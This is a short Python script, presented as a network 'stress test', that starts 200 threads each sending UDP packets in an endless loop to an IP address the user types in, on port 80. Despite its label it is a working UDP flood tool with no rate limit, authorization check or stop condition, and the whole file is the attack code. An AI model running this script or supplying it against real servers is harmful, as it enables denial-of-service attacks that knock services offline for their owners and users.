import socket
from threading import Thread

Host = input("What is the IP Address of the Network/Server you are testing? \n")
Port = 80
Data = "This is a stress test!, please do not take any further action!"

def main():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(Data.encode('ascii'), (Host, Port))

for i in range(200):
    t = Thread(target=main)
    t.start()
